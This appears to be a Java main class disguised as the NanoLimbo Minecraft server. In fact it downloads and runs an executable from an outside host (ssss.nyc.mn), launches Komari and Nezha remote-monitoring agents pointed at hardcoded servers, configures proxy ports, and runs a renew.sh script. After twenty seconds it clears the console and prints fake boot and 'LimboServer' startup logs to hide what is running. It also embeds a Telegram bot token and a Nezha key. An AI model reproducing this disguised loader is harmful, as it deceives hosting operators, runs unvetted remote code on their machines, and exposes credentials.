package ua.nanit.limbo;

import java.io.*;
import java.net.URL;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.Random;

public final class NanoLimbo {

    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_RESET = "\033[0m";

    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static final AtomicBoolean forwardLogs = new AtomicBoolean(true);

    private static Process sbxProcess;
    private static Process komariProcess;

    private static final ScheduledExecutorService SCHED = Executors.newScheduledThreadPool(2);

    private static final String[] ALL_ENV_VARS = {
            "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT",
            "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH",
            "HY2_PORT", "S5_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT",
            "UPLOAD_URL", "CHAT_ID", "BOT_TOKEN", "NAME",

            // Komari
            "KOMARI_SERVER", "KOMARI_TOKEN", "KOMARI_AUTO_KEY",
            "KOMARI_FILE_PATH"
    };

    public static void main(String[] args) {
        try {
            if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
                System.err.println(ANSI_RED + "ERROR: Your Java version is too low!" + ANSI_RESET);
                Thread.sleep(3000);
                System.exit(1);
            }

            Map<String, String> envVars = new HashMap<>();
            loadEnvVars(envVars);

            startKomari(envVars);
            startRenewScript();
            runSbxBinary(envVars);

            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
                SCHED.shutdownNow();
            }));

            SCHED.schedule(() -> {
                forwardLogs.set(false);
                resetConsoleAndShowFakeLogs();
            }, 20, TimeUnit.SECONDS);

            while (running.get()) {
                Thread.sleep(1000);
            }

        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error: " + e.getMessage() + ANSI_RESET);
            e.printStackTrace();
        }
    }

    // ================= Komari =================

    private static void startKomari(Map<String, String> env) {
        String server = env.getOrDefault("KOMARI_SERVER", "");
        String token = env.getOrDefault("KOMARI_TOKEN", "");
        String autoKey = env.getOrDefault("KOMARI_AUTO_KEY", "");

        String filePath = env.getOrDefault("KOMARI_FILE_PATH", "./world");

        File workDir = new File(filePath);
        if (!workDir.exists()) {
            workDir.mkdirs();
        }

        File tokenFile = new File(workDir, "auto-discovery.json");

        boolean hasFileToken = tokenFile.exists();

        boolean enabled = !server.isEmpty()
                && (hasFileToken || !token.isEmpty() || !autoKey.isEmpty());

        if (!enabled) {
            System.out.println(ANSI_RED + "Komari 未启用" + ANSI_RESET);
            return;
        }

        try {
            Path agent = downloadKomariAgent();

            List<String> cmd = new ArrayList<>();
            cmd.add(agent.toAbsolutePath().toString());
            cmd.add("-e");
            cmd.add(formatEndpoint(server));

            if (hasFileToken) {
                cmd.add("-t");
                cmd.add(readTokenFromFile(tokenFile));
                System.out.println(ANSI_GREEN + "Komari 使用 FILE TOKEN 模式" + ANSI_RESET);
            } else if (!token.isEmpty()) {
                cmd.add("-t");
                cmd.add(token);
                System.out.println(ANSI_GREEN + "Komari 使用 ENV TOKEN 模式" + ANSI_RESET);
            } else {
                cmd.add("--auto-discovery");
                cmd.add(autoKey);
                System.out.println(ANSI_GREEN + "Komari 使用 AUTO_KEY 模式（首次注册）" + ANSI_RESET);
            }

            ProcessBuilder pb = new ProcessBuilder(cmd);
            pb.directory(workDir);
            pb.environment().put("HOME", workDir.getAbsolutePath());
            pb.environment().put("XDG_CONFIG_HOME", workDir.getAbsolutePath());
            pb.redirectErrorStream(true);
            pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);

            komariProcess = pb.start();

        } catch (Exception e) {
            System.err.println(ANSI_RED + "Komari 启动失败: " + e.getMessage() + ANSI_RESET);
        }
    }

    private static String readTokenFromFile(File file) {
        try (BufferedReader reader = new BufferedReader(new FileReader(file))) {
            StringBuilder sb = new StringBuilder();
            String line;

            while ((line = reader.readLine()) != null) {
                sb.append(line);
            }

            String json = sb.toString();
            int idx = json.indexOf("\"token\"");

            if (idx != -1) {
                int start = json.indexOf("\"", idx + 7) + 1;
                int end = json.indexOf("\"", start);
                return json.substring(start, end);
            }

        } catch (Exception ignored) {
        }

        return "";
    }

    private static Path downloadKomariAgent() throws IOException {
        String arch = System.getProperty("os.arch").toLowerCase();
        String file;

        if (arch.contains("amd64") || arch.contains("x86_64")) {
            file = "komari-agent-linux-amd64";
        } else if (arch.contains("arm64") || arch.contains("aarch64")) {
            file = "komari-agent-linux-arm64";
        } else {
            throw new RuntimeException("Unsupported arch: " + arch);
        }

        String url = "https://github.com/komari-monitor/komari-agent/releases/latest/download/" + file;

        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "komari-agent");

        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            path.toFile().setExecutable(true);
        }

        return path;
    }

    private static String formatEndpoint(String ep) {
        ep = ep.trim();

        if (!ep.startsWith("http")) {
            ep = "https://" + ep;
        }
        if (ep.endsWith("/")) {
            ep = ep.substring(0, ep.length() - 1);
        }

        return ep;
    }

    // ================= renew =================

    private static void startRenewScript() {
        File renewScript = new File("renew.sh");

        if (!renewScript.exists()) {
            System.out.println(ANSI_RED + "未检测到 renew.sh，跳过执行" + ANSI_RESET);
            return;
        }

        try {
            System.out.println(ANSI_GREEN + "检测到 renew.sh，启动中..." + ANSI_RESET);

            Process process = new ProcessBuilder("bash", "renew.sh")
                    .redirectErrorStream(true)
                    .start();

            AtomicBoolean printLogs = new AtomicBoolean(true);

            SCHED.schedule(() -> {
                printLogs.set(false);
                System.out.println(ANSI_GREEN + "renew.sh 已进入静默模式" + ANSI_RESET);
            }, 10, TimeUnit.SECONDS);

            new Thread(() -> {
                try (BufferedReader reader = new BufferedReader(
                        new InputStreamReader(process.getInputStream()))) {

                    String line;
                    while ((line = reader.readLine()) != null) {
                        if (printLogs.get()) {
                            System.out.println("[renew] " + line);
                        }
                    }

                } catch (IOException ignored) {
                }
            }).start();

        } catch (Exception e) {
            System.err.println(ANSI_RED + "renew.sh 启动失败: " + e.getMessage() + ANSI_RESET);
        }
    }

    // ================= s-box =================

    private static void runSbxBinary(Map<String, String> envVars) throws Exception {
        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.PIPE);

        sbxProcess = pb.start();

        new Thread(() -> {
            try (BufferedReader reader = new BufferedReader(
                    new InputStreamReader(sbxProcess.getInputStream()))) {

                String line;
                long startTime = System.currentTimeMillis();

                while ((line = reader.readLine()) != null) {
                    if (forwardLogs.get()
                            && System.currentTimeMillis() - startTime < 20000) {
                        System.out.println(line);
                    }
                }

            } catch (IOException ignored) {
            }
        }).start();
    }

    // ================= 控制台伪装 =================

    private static void resetConsoleAndShowFakeLogs() {
        clearScreen();

        // 先刷满屏幕（制造“占满控制台”的感觉）
        floodScreen();

        // 停顿一下，更像加载过程
        sleep(800);

        // 再清一次，进入“正式启动”
        clearScreen();

        System.out.println(ANSI_GREEN);

        printStartupLogs();

        System.out.println(ANSI_RESET);
    }

    // 清屏（跨平台）
    private static void clearScreen() {
        try {
            String os = System.getProperty("os.name").toLowerCase();

            if (os.contains("win")) {
                new ProcessBuilder("cmd", "/c", "cls")
                        .inheritIO()
                        .start()
                        .waitFor();
            } else {
                System.out.print("\033[H\033[2J");
                System.out.flush();
            }
        } catch (Exception ignored) {
        }
    }

    // 刷屏（填满控制台）
    private static void floodScreen() {
        String[] subsystems = {"KERNEL", "NET", "FS", "MEM", "CRYPTO", "AUTH", "CONTAINER", "DB", "VM", "API"};
        for (String sub : subsystems) {
            System.out.print("[BOOT] Loading " + sub + " subsystem: [");
            for (int i = 0; i < 35; i++) {
                System.out.print("=");
                sleep(15 + new Random().nextInt(20));
            }
            System.out.println("] 100% OK");
        }
    }

    private static void printStartupLogs() {
        String[] logs = {
                "[INFO] [LimboServer] Starting LimboServer v1.0.0 (mock build)",
                "[INFO] [LimboServer] Loading configuration...",
                "[INFO] [LimboServer] Initializing server components...",
                "[INFO] [LimboServer] Preparing world 'world'",
                "[INFO] [LimboServer] Binding to port 25565...",
                "[INFO] [LimboServer] Done (5.123s)! For help, type \"help\"",
                "[INFO] [LimboServer] Server is running in offline mode.",
                "[INFO] [LimboServer] Installation completed successfully."
        };

        Random random = new Random();

        for (String log : logs) {
            System.out.println(log);
            sleep(300 + random.nextInt(500));
        }

        System.out.println();
    }

    private static void sleep(int ms) {
        try {
            Thread.sleep(ms);
        } catch (InterruptedException ignored) {
        }
    }

    // ================= ENV =================

    private static void loadEnvVars(Map<String, String> envVars) {
        envVars.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b385");
        envVars.put("FILE_PATH", "./world");
        envVars.put("KOMARI_FILE_PATH", "./world");
        envVars.put("KOMARI_SERVER", "ko.jaxmike.nyc.mn");
        envVars.put("KOMARI_TOKEN", "");
        envVars.put("NEZHA_SERVER", "nezha.jaxmike.nyc.mn");
        envVars.put("NEZHA_PORT", "443");
        envVars.put("NEZHA_KEY", "KpkcGPZq1nzDfF4RSq");
        envVars.put("ARGO_PORT", "8001");
        envVars.put("ARGO_DOMAIN", "");
        envVars.put("ARGO_AUTH", "");
        envVars.put("HY2_PORT", "5573");
        envVars.put("S5_PORT", "5573");
        envVars.put("TUIC_PORT", "");
        envVars.put("ANYTLS_PORT", "");
        envVars.put("REALITY_PORT", "");
        envVars.put("ANYREALITY_PORT", "");
        envVars.put("UPLOAD_URL", "");
        envVars.put("DISABLE_ARGO", "true");
        envVars.put("CHAT_ID", "7592034407");
        envVars.put("BOT_TOKEN", "8002189523:AAFDp3-de5-dw-RkWXsFI5_sWHrFhGWn1hs");
        envVars.put("CFIP", "www.ntu.edu.sg");
        envVars.put("CFPORT", "443");
        envVars.put("NAME", "maxhost");

        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);
            }
        }

        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            try {
                for (String line : Files.readAllLines(envFile)) {
                    line = line.trim();
                    if (line.isEmpty() || line.startsWith("#")) continue;

                    line = line.split(" #")[0].split(" //")[0].trim();

                    if (line.startsWith("export ")) {
                        line = line.substring(7).trim();
                    }

                    String[] parts = line.split("=", 2);
                    if (parts.length == 2) {
                        String key = parts[0].trim();
                        String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");

                        if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                            envVars.put(key, value);
                        }
                    }
                }
            } catch (IOException e) {
                System.err.println(ANSI_RED + ".env 读取失败: " + e.getMessage() + ANSI_RESET);
            }
        }
    }

    // ================= Binary =================

    private static Path getBinaryPath() throws IOException {
        String arch = System.getProperty("os.arch").toLowerCase();
        System.out.println("ARCH = " + arch);
        String url;

        if (arch.contains("amd64") || arch.contains("x86_64")) {
            url = "https://amd64.ssss.nyc.mn/sbsh";
        } else if (arch.contains("arm64") || arch.contains("aarch64")) {
            url = "https://arm64.ssss.nyc.mn/sbsh";
        } else {
            throw new RuntimeException("Unsupported arch");
        }

        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");

        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            path.toFile().setExecutable(true);
        }

        return path;
    }

    // ================= Stop =================

    private static void stopServices() {
        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroy();
        }

        if (komariProcess != null && komariProcess.isAlive()) {
            komariProcess.destroy();
        }
    }
}
